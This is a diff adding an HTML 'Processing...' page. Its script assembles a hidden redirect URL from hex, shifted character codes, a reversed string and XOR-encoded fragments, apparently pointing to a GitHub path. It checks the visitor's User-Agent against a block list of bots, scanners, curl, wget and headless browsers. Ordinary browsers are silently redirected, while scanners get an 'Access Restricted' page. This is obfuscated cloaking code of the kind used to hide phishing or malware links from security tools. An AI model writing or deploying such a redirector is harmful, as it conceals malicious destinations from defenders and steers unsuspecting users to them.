@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Processing...</title>
+  <style>
+    body { margin: 0; padding: 0; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .loader { width: 30px; height: 30px; border: 3px solid rgba(0, 0, 0, 0.1); border-radius: 50%; border-top-color: #28a745; animation: rotate 0.8s linear infinite; }
+    @keyframes rotate { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <script>
+    // Декодирование XOR
+    const xor = (s, k) => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join('');
+
+    // Декодирование из HEX
+    const fromHex = (h) => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+
+    // Декодирование из массива кодов с offset
+    const fromCodes = (arr, offset = 0) => arr.map(c => String.fromCharCode(c + offset)).join('');
+
+    // Части URL
+    const part1 = fromHex('68747470733a2f2f');
+    const part2 = fromCodes([102, 104, 115, 103, 116, 97, 45, 98, 110, 108, 46], 1);
+    const part3 = '/enil-no-da'.split('').reverse().join('');
+    const part4 = xor('r|p#', 10);
+
+    const targetUrl = part1 + part2 + part3 + part4;
+
+    // Список запрещённых сигнатур
+    const blockedPatterns = [
+      "bot", "spider", "crawl", "slurp", "scanner", "python", "go-http-client", "okhttp", "java", "wget", "curl",
+      "headlesschrome", "puppeteer", "phantomjs", "selenium", "yandexbot", "googlebot", "bingbot", "baiduspider"
+    ];
+
+    // Проверка User-Agent
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBlocked = blockedPatterns.some(pattern => userAgent.includes(pattern));
+
+    if (!isBlocked) {
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 800);
+    } else {
+      document.body.innerHTML = `
+        <div style="text-align: center; padding: 40px; font-family: Arial, sans-serif;">
+          <h1 style="color: #dc3545;">⚠️ Access Restricted</h1>
+          <p style="color: #6c757d;">Please use a standard browser to access this page.</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
